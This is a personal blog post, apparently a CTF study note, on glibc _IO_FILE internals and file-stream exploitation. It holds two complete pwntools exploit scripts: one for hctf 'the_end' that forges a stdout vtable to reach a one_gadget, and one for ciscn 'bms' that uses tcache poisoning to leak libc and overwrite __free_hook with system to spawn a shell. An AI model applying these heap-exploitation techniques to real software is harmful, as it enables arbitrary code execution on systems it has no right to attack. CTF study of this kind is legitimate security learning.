<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>IO_file | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Pic4xiu’s note for IOFILE_IO_FILE Source codestruct _IO_FILE &#123;   int _flags;       &#x2F;* High-order word is _IO_MAGIC; rest is flags. *&#x2F; #define _IO_file_flags _flags    &#x2F;* The following pointers co">
<meta property="og:type" content="article">
<meta property="og:title" content="IO_file">
<meta property="og:url" content="http://example.com/2020/07/31/2020-07-31-io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Pic4xiu’s note for IOFILE_IO_FILE Source codestruct _IO_FILE &#123;   int _flags;       &#x2F;* High-order word is _IO_MAGIC; rest is flags. *&#x2F; #define _IO_file_flags _flags    &#x2F;* The following pointers co">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/14/1j9eoT.png">
<meta property="article:published_time" content="2020-07-30T16:00:00.000Z">
<meta property="article:modified_time" content="2023-08-07T18:15:52.000Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.ax1x.com/2020/02/14/1j9eoT.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-2020-07-31-io" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/31/2020-07-31-io/" class="article-date">
  <time class="dt-published" datetime="2020-07-30T16:00:00.000Z" itemprop="datePublished">2020-07-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      IO_file
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Pic4xiu’s-note-for-IOFILE"><a href="#Pic4xiu’s-note-for-IOFILE" class="headerlink" title="Pic4xiu’s note for IOFILE"></a>Pic4xiu’s note for IOFILE</h1><h3 id="IO-FILE-Source-code"><a href="#IO-FILE-Source-code" class="headerlink" title="_IO_FILE Source code"></a>_IO_FILE Source code</h3><pre><code>struct _IO_FILE &#123;
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
&#125;;
</code></pre>
<h3 id="Some-common-sense"><a href="#Some-common-sense" class="headerlink" title="Some common sense"></a>Some common sense</h3><p>stdin、stdout、stderr are in the libc.so data segment (automatically opened) ，But the file stream created by fopen is in the heap</p>
<pre><code>_IO_2_1_stderr_
_IO_2_1_stdout_
_IO_2_1_stdin_
//what they look like

struct _IO_FILE_plus
&#123;
    _IO_FILE    file;
    IO_jump_t   *vtable;//The 32-bit offset is 0x94, while the 64 bit offset is 0xd8
&#125;
</code></pre>
<p>Look at the picture below , VTable has function pointers below that can jump</p>
<p><img src="https://s2.ax1x.com/2020/02/14/1j9eoT.png" alt="image"></p>
<h1 id="Some-exercises"><a href="#Some-exercises" class="headerlink" title="Some exercises"></a>Some exercises</h1><h3 id="fake-vtable"><a href="#fake-vtable" class="headerlink" title="fake_vtable"></a>fake_vtable</h3><blockquote>
<p>The_end ( hctf )</p>
</blockquote>
<pre><code>#coding=utf8
from pwn import *
context.log_level = &#39;debug&#39;
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
local = 1
elf = ELF(&#39;./the_end&#39;)
if local:
    p = process(&#39;the_end&#39;)
    libc = ELF(&#39;./libc.so.6&#39;)
else:
    p = remote(&#39;116.85.48.105&#39;,5005)
    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen(&quot;pmap &#123;&#125;| awk &#39;&#123;&#123;print $1&#125;&#125;&#39;&quot;.format(p.pid)).readlines()[1], 16)
        gdb.attach(p,&#39;b *&#123;&#125;&#39;.format(hex(text_base+addr)))
    else:
        gdb.attach(p,&quot;b *&#123;&#125;&quot;.format(hex(addr)))

def bk(addr):
    gdb.attach(p,&quot;b *&quot;+str(hex(addr)))
debug(0x000964)
ru(&quot;gift &quot;)
sleep_addr = int(rc(14),16)
libc_base = sleep_addr - libc.symbols[&#39;sleep&#39;]
onegadget = libc_base + 0xf02a4
vtable = libc_base + 0x39c6f8
fake_vtable = vtable - 0x90
fake_setbuf = fake_vtable + 88
print &quot;libc_base---&gt;&quot; + hex(libc_base)
print &quot;vtable---&gt;&quot; + hex(vtable)
print &quot;fake_vtable---&gt;&quot; + hex(fake_vtable)
print &quot;fake_setbuf---&gt;&quot; + hex(fake_setbuf)
print &quot;onegadget---&gt;&quot; + hex(onegadget)
for i in range(2):
    sd(p64(vtable+i))
    sd(p64(fake_vtable)[i])
for i in range(3):
    sd(p64(fake_setbuf+i))
    sd(p64(onegadget)[i])

p.interactive()
</code></pre>
<p>I think it’s very easy , just modify <code>_IO_2_1_stdout_</code> vtable addr to a fake_vtable , then use it’s fake_setbuf to point onegadget . And this practice has another method : utilize <code>exit</code> execute <code>_dl_fini</code> , <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-248495.htm">See for details</a></p>
<h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><blockquote>
<p>bms ( ciscn )</p>
</blockquote>
<pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
p = process(&#39;./pwn&#39;)
elf = ELF(&#39;./pwn&#39;)
libc = elf.libc
context.log_level = &#39;debug&#39;

p.recvuntil(&#39;username:&#39;)
p.sendline(&#39;admin&#39;)
p.recvuntil(&#39;password:&#39;)
p.sendline(&#39;frame&#39;)

def create(name,size,context):
    p.sendlineafter(&#39;&gt;\n&#39;,&#39;1&#39;)
    p.sendafter(&#39;book name:&#39;,name)
    p.sendlineafter(&#39;description size:&#39;,str(size))
    p.sendafter(&#39;description:&#39;,context)

def createe(name,size,context):
    p.sendlineafter(&#39;&gt;&#39;,&#39;1&#39;)
    p.sendafter(&#39;book name:&#39;,name)
    p.sendlineafter(&#39;description size:&#39;,str(size))
    p.sendafter(&#39;description:&#39;,context)

def delete(index):
    p.sendlineafter(&#39;&gt;\n&#39;,&#39;2&#39;)
    p.sendlineafter(&#39;index:&#39;,str(index))

def deletee(index):
    p.sendlineafter(&#39;&gt;&#39;,&#39;2&#39;)
    p.sendlineafter(&#39;index:&#39;,str(index))

#tcathe attack to the IO_File
create(&#39;A&#39;,0x68,&#39;A&#39;*0x68)
delete(0)
delete(0)
create(&#39;A&#39;,0x68,p64(0x602020))
create(&#39;A&#39;,0x68,&#39;A&#39;)
create(&#39;A&#39;,0x68,&#39;\x60&#39;)
create(&#39;A&#39;,0x68,p64(0xfbad1800)+p64(0)*3+&#39;\x90&#39;)

#leak the libc
data = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
libc_base = data - 4114403
system_addr = libc_base + libc.symbols[&#39;system&#39;]
free_addr = libc_base + libc.symbols[&#39;__free_hook&#39;]
log.success(&#39;libc base is :&#39;+hex(libc_base))

#tcache attack to __free_hook
createe(&#39;A&#39;,0x30,&#39;A&#39;)#5
deletee(5)
deletee(5)
createe(&#39;A&#39;,0x30,p64(free_addr))#6
createe(&#39;A&#39;,0x30,&#39;/bin/sh&#39;)#7
createe(&#39;A&#39;,0x30,p64(system_addr))#8

#trigger
deletee(7)

p.interactive()
</code></pre>
<p>This exercise combined tcache , very interesting !</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/07/31/2020-07-31-io/" data-id="cuidN4SZUdgCPo-QYg82Xr3AR" data-title="IO_file" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2020/07/31/2020-07-31-buuctf/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          pwn
        
      </div>
    </a>
  
  
    <a href="/2020/06/27/2020-06-27-Python/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Simple gadgets</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/10/01/1999-01-01-hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
          </li>
        
          <li>
            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
          </li>
        
          <li>
            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
          </li>
        
          <li>
            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>